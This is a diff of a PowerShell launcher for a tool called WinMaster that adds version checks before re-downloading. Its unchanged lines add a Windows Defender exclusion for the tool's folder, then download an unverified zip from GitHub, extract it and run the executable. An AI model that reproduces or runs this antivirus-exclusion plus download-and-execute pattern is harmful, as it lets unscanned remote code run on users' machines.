@@ -54,7 +54,9 @@ $workDir = "$env:LOCALAPPDATA\WinMaster"
 $exePath = "$workDir\App\WinMaster.exe"
 $zipPath = "$workDir\WinMaster.zip"
 $extractPath = "$workDir\App"
+$versionFile = "$workDir\version.txt"
 $zipUrl = "https://github.com/nghittph50154/winmaster/raw/main/publish_out/WinMaster.zip"
+$EXPECTED_VERSION = "1.1.1"
 
 if (-not (Test-Path $workDir)) {
     New-Item -ItemType Directory -Path $workDir -Force | Out-Null
@@ -64,14 +66,30 @@ if (Get-Command Add-MpPreference -ErrorAction SilentlyContinue) {
     Add-MpPreference -ExclusionPath $workDir -ErrorAction SilentlyContinue
 }
 
-# If WinMaster.exe exists, launch instantly! If missing, download fresh copy
-if (Test-Path $exePath) {
-    Write-Host "Launching WinMaster..." -ForegroundColor Cyan
+# Check version: if exe exists but version is outdated, re-download
+$needDownload = $true
+if ((Test-Path $exePath) -and (Test-Path $versionFile)) {
+    $localVersion = (Get-Content $versionFile -Raw).Trim()
+    if ($localVersion -eq $EXPECTED_VERSION) {
+        $needDownload = $false
+        Write-Host "WinMaster $EXPECTED_VERSION is up to date. Launching..." -ForegroundColor Cyan
+    } else {
+        Write-Host "Update detected: $localVersion -> $EXPECTED_VERSION. Downloading update..." -ForegroundColor Yellow
+        Remove-Item -Path $extractPath -Recurse -Force -ErrorAction SilentlyContinue
+        Remove-Item -Path $versionFile -Force -ErrorAction SilentlyContinue
+    }
+} elseif (Test-Path $exePath) {
+    # Exe exists but no version file (old install) - re-download to get latest
+    Write-Host "No version info found. Re-downloading latest WinMaster..." -ForegroundColor Yellow
+    Remove-Item -Path $extractPath -Recurse -Force -ErrorAction SilentlyContinue
+}
+
+if (-not $needDownload) {
     Start-Process -FilePath $exePath
     exit
 }
 
-Write-Host "Downloading WinMaster standalone application..." -ForegroundColor Green
+Write-Host "Downloading WinMaster $EXPECTED_VERSION..." -ForegroundColor Green
 [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
 Invoke-WebRequest -Uri $zipUrl -OutFile $zipPath -UseBasicParsing
 
@@ -79,5 +97,9 @@ Write-Host "Extracting WinMaster..." -ForegroundColor Green
 if (Test-Path $extractPath) { Remove-Item -Path $extractPath -Recurse -Force }
 Expand-Archive -Path $zipPath -DestinationPath $extractPath -Force
 
-Write-Host "Launching WinMaster..." -ForegroundColor Cyan
+# Save version file after successful download
+Set-Content -Path $versionFile -Value $EXPECTED_VERSION
+
+Write-Host "Launching WinMaster $EXPECTED_VERSION..." -ForegroundColor Cyan
 Start-Process -FilePath $exePath
+
